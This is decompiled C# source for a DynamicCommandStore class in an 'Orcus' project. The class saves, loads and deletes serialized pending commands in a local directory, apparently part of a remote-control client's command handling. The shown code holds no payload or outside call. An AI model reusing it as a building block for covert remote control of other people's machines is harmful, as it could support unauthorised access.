using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Config;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommandManagement;

public class DynamicCommandStore
{
	private readonly Dictionary<PotentialCommand, FileInfo> _files;

	public object ListLock { get; } = new object();


	public List<PotentialCommand> StoredCommands { get; }

	public DynamicCommandStore()
	{
		StoredCommands = new List<PotentialCommand>();
		_files = new Dictionary<PotentialCommand, FileInfo>();
	}

	public void Initialize()
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.PotentialCommandsDirectory);
		if (directoryInfo.Exists)
		{
			FileInfo[] files = directoryInfo.GetFiles("*.PotentialCommand");
			foreach (FileInfo fileInfo in files)
			{
				TryAddPotentialCommand(fileInfo);
			}
		}
	}

	public void AddStoredCommand(PotentialCommand potentialCommand)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		Serializer val = new Serializer(typeof(PotentialCommand));
		FileInfo fileInfo = new FileInfo(FileExtensions.GetUniqueFileName(Consts.PotentialCommandsDirectory, "PotentialCommand"));
		Directory.CreateDirectory(Consts.PotentialCommandsDirectory);
		File.WriteAllBytes(fileInfo.FullName, val.Serialize((object)potentialCommand));
		lock (ListLock)
		{
			_files.Add(potentialCommand, fileInfo);
			StoredCommands.Add(potentialCommand);
		}
	}

	public void RemoveStoredCommand(PotentialCommand potentialCommand)
	{
		lock (ListLock)
		{
			StoredCommands.Remove(potentialCommand);
			if (_files.TryGetValue(potentialCommand, out var value))
			{
				_files.Remove(potentialCommand);
				try
				{
					value.Delete();
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private void TryAddPotentialCommand(FileInfo fileInfo)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			PotentialCommand val = new Serializer(typeof(PotentialCommand)).Deserialize<PotentialCommand>(File.ReadAllBytes(fileInfo.FullName));
			lock (ListLock)
			{
				StoredCommands.Add(val);
				_files.Add(val, fileInfo);
			}
		}
		catch (Exception)
		{
		}
	}
}
